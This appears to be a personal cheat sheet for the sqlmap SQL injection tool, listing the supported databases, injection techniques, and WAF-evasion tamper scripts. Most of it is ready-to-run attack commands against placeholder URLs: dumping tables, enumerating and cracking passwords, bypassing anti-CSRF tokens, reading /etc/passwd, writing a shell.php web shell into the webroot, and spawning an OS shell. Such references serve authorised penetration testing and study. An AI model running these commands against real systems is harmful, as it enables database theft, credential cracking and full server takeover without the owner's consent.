#SQLMAP #SQL #sqlattack

- [sqlmap: automatic SQL injection and database takeover tool](https://sqlmap.org/)
- [Usage · sqlmapproject/sqlmap Wiki · GitHub](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [SQLMap - Cheetsheat | HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
- [sqlmap Cheat Sheet: Commands for SQL Injection Attacks + PDF & JPG (comparitech.com)](https://www.comparitech.com/net-admin/sqlmap-cheat-sheet/)
- free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.

|Detection Engines|||
|---|---|---|
|Target connection|Injection detection|Fingerprinting|
|Enumeration|Optimization|Protection detection and bypass using "tamper" scripts|
|Database content retrieval|File system access|Execution of the operating system (OS) commands|

|Supported Databases||||
|---|---|---|---|
|`MySQL`|`Oracle`|`PostgreSQL`|`Microsoft SQL Server`|
|`SQLite`|`IBM DB2`|`Microsoft Access`|`Firebird`|
|`Sybase`|`SAP MaxDB`|`Informix`|`MariaDB`|
|`HSQLDB`|`CockroachDB`|`TiDB`|`MemSQL`|
|`H2`|`MonetDB`|`Apache Derby`|`Amazon Redshift`|
|`Vertica`, `Mckoi`|`Presto`|`Altibase`|`MimerSQL`|
|`CrateDB`|`Greenplum`|`Drizzle`|`Apache Ignite`|
|`Cubrid`|`InterSystems Cache`|`IRIS`|`eXtremeDB`|
|`FrontBase`|

- Supported techniques
	- `B`: Boolean-based blind
	- `E`: Error-based
	- `U`: Union query-based
	- `S`: Stacked queries
	- `T`: Time-based blind
	- `Q`: Inline queries

- Attacks
	- `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch` batch skips the rest of the user input and runs the defaults
	- `sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'` example attack pulled from a 'Copy as cURL' from browser dev tools
	- `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` basic post request whereas `--data` is the POST body parameters
	- `sqlmap - {request file name}` automatically use a saved burp request
	- `--cookie='{value}'` custom cookie
	- `-H='{http header}'` custom header
	- `sqlmap -u www.target.com --data='id=1' --method PUT` PUT method with body data
	- `--cookie="id=1*"` the * indicates a custom injection mark with the cookie 'id'
	- `-p cookie` test the parameter 'cookie'
	- **NOTE** you need `--level=2` or higher to do cookie injection
	- `-t /tmp/traffic.txt` store all the generated network traffic in a file
	- `--proxy socks5://127.0.0.1:8080` proxy to burp
	- `--prefix="%'))"` prepend specific string to all requests
	- `--suffix="-- -"` append a specific string to all requests
	- `--no-cast` option, SQLMap will not perform this automatic casting, which can be useful in certain scenarios where you need the data in its original format
	- `--union-cols=5` forces sqlmap to use union injection and 5 columns of data
	- `--start=2 --stop=3` only get rows 2 and 3
	- `--where="name LIKE 'f%'"` find all names that start with **f**
	- `--search -T user` search the schema for a table called **user**
	- `--search -C pass` search the schema for a column called **pass**
	- `--data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` tell SQLMap there is a csrf token and what parameter stores it
	- `--randomize=rp` randomize values for parameter **rp** this is for psuedo CSRF URLs
	- `--eval="import hashlib; h=hashlib.md5(id).hexdigest()"` this uses python to add a md5 hash to the **h** parameter, some sites use hashing to validate input
	- `--random-agent` dont use the default sqlmap user agent

|**Command**|**Description**|
|---|---|
|`sqlmap -h`|View the basic help menu|
|`sqlmap -hh`|View the advanced help menu|
|`sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`|Run `SQLMap` without asking for user input|
|`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`|`SQLMap` with POST request|
|`sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`|POST request specifying an injection point with an asterisk|
|`sqlmap -r req.txt`|Passing an HTTP request file to `SQLMap`|
|`sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`|Specifying a cookie header|
|`sqlmap -u www.target.com --data='id=1' --method PUT`|Specifying a PUT request|
|`sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`|Store traffic to an output file|
|`sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`|Specify verbosity level|
|`sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`|Specifying a prefix or suffix|
|`sqlmap -u www.example.com/?id=1 -v 3 --level=5`|Specifying the level and risk|
|`sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`|Basic DB enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`|Table enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`|Table/row enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`|Conditional enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --schema`|Database schema enumeration|
|`sqlmap -u "http://www.example.com/?id=1" --search -T user`|Searching for data|
|`sqlmap -u "http://www.example.com/?id=1" --passwords --batch`|Password enumeration and cracking|
|`sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`|Anti-CSRF token bypass|
|`sqlmap --list-tampers`|List all tamper scripts|
|`sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`|Check for DBA privileges|
|`sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`|Reading a local file|
|`sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`|Writing a file|
|`sqlmap -u "http://www.example.com/?id=1" --os-shell`|Spawning an OS shell|

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |